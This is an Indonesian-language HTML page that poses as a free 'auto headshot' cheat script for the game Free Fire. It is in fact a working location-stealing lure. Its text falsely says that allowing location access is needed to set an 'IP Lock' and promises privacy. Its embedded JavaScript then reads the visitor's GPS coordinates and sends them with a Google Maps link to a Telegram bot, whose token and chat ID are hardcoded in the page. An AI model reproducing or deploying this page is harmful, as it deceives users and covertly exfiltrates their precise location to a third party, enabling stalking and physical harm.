<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>FREE SCRIPT FF AUTO HS</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      user-select: none;
    }
    body, html {
      width: 100%;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
      background: #0e0e0e;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      flex-direction: column;
      padding: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 15px;
      color: #00ff00;
    }
    p {
      font-size: 16px;
      margin-bottom: 20px;
    }
    .info {
      font-size: 14px;
      color: #aaaaaa;
      margin-bottom: 30px;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background-color: #00ff00;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      color: black;
      font-weight: bold;
      transition: 0.3s;
    }
    button:hover {
      background-color: #00cc00;
    }
  </style>
</head>
<body>
  <h1>FREE SCRIPT FF AUTO HS</h1>
  <p>Harap pencet tombol Izinkan Lokasi,<br>terus izinkan lokasi agar bisa setting IP Lock anda agar script work dan tidak ada error.</p>
  <div class="info">
    Informasi:<br>
    Kami tidak akan menyebarkan identitas anda.
  </div>
  <button onclick="kirimLokasi()">Izinkan Lokasi</button>

  <script>
    const BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
    const CHAT_ID = '7218964278';

    function kirimLokasi() {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const link = `https://maps.google.com/?q=${lat},${lon}`;
        const pesan = `Lokasi baru:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: ${link}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan
          })
        }).then(() => {
          alert("Lokasi berhasil dikirim!");
        }).catch(() => {
          alert("Gagal mengirim lokasi.");
        });
      }, () => {
        alert("Gagal mendapatkan lokasi.");
      });
    }
  </script>
</body>
</html>
